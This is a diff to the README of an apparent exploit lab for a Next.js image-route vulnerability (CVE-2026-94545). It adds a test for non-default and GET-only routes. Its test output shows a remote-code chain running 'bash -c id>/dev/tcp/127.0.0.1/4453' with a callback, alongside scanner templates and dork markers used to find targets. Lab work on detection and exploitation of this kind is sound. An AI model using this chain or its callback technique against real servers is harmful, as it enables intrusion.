@@ -30,6 +30,7 @@ lab/
 ├── check-dorks.sh      prove the FOFA body markers are in real Next.js HTML
 ├── test-standard-ports.sh  run both templates against :80 and :443
 ├── tls-proxy.py        TLS terminator used by test-standard-ports.sh
+├── test-alt-paths.sh   sink at a non-default route (/og), incl. the GET-only case
 └── tools/
     ├── nuclei-shim.mjs offline runner for nuclei JS-protocol templates
     ├── http-fetch.mjs  one-shot HTTP helper used by the shim
@@ -347,6 +348,39 @@ then `docker run -d -p 3000:3000 cve-2026-94545`):
 If the target's worker is replaced by the exploit, `./start.sh --restart vulnerable`
 brings it back.
 
+### Routes are not always /api/og, and the payload needs a body
+
+`test-alt-paths.sh` builds an app whose `ImageResponse` route lives at `/og` (so `/api/og`
+answers 404) and checks the three ways the templates can find it, then exploits it, then does
+the same for a GET-only variant:
+
+```bash
+$ ./test-alt-paths.sh
+  detection, three ways
+  PASS default paths find /og  NEXTJS_OG_XINCLUDE_REACHABLE http://127.0.0.1:3020 POST /og probe=2522895B control=21979B ratio=114.8
+  PASS -var ogpath=/og works
+  PASS -var paths=/nope,/og works
+
+  exploitation of the non-default route
+  PASS exploit matched via /og  CVE-2026-94545 payload sent to http://127.0.0.1:3020 POST /og: connection closed by target, expected when the chain executes (25286 bytes delivered) cmd=bash -c 'id>/dev/tcp/127.0.0.1/4453'
+  PASS callback from the /og chain  uid=1001(user) gid=1001(user) groups=1001(user),27(sudo),100(users)
+  PASS the :3020 worker was replaced
+
+  GET-only route (the payload cannot ride a URL)
+  PASS detection matches the GET-only route (probe fits in a URL)
+  PASS a 25 KB query string is rejected with HTTP 431, as expected  (Node maxHeaderSize)
+  PASS the exploit template reports 'no body sink' instead of firing
+  PASS no payload was delivered to the GET-only route
+
+  summary: 10 passed, 0 failed
+```
+
+Two consequences worth remembering: the small XInclude probe (a few hundred bytes) fits in a
+query string, so **detection** works on GET-only routes; the ~25 KB ROP payload does not, so
+**exploitation** needs a route that reads the request body. Node answers
+`431 Request Header Fields Too Large` above its 16 KB `maxHeaderSize` default, which is what
+the exploit template reports as *no body sink* rather than firing into the void.
+
 ### Ports
 
 | Port | Owner | Serves |
@@ -361,6 +395,8 @@ brings it back.
 | 443 | `./test-standard-ports.sh` | `tls-proxy.py`, TLS front end (root) |
 | 8080 | `./test-standard-ports.sh` | backend behind the TLS terminator |
 | 4452 | `./test-standard-ports.sh` | its own OOB listener, so the shim's new-line count is exact |
+| 3020, 3021 | `./test-alt-paths.sh` | scratch apps whose sink lives at `/og` (3021 = GET-only) |
+| 4453 | `./test-alt-paths.sh` | its own OOB listener |
 
 Everything binds `0.0.0.0`, so the ports also work through a forwarded host - except for the
 two OOB listeners: those are raw TCP sinks, not web servers, so an HTTP request to them
